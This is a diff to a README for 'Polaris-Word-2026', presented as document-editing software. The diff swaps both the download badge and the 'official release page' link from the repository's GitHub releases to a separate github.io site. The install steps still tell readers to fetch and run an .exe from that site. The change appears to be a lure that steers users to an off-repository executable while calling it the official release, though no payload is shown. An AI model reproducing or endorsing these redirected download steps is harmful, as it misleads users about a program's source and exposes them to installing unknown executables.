@@ -1,6 +1,6 @@
 # 📑 Polaris-Word-2026 - Create professional documents with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lynnettworth558/Polaris-Word-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://lynnettworth558.github.io)
 
 ## Overview 📝
 
@@ -21,7 +21,7 @@ Your computer requires the following to run this software:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/Lynnettworth558/Polaris-Word-2026/releases) to access the installers.
+1. Visit the [official release page](https://lynnettworth558.github.io) to access the installers.
 2. Select the latest version listed under the Assets section.
 3. Click the file ending in .exe to start the download.
 4. Locate the file in your Downloads folder once the process finishes.
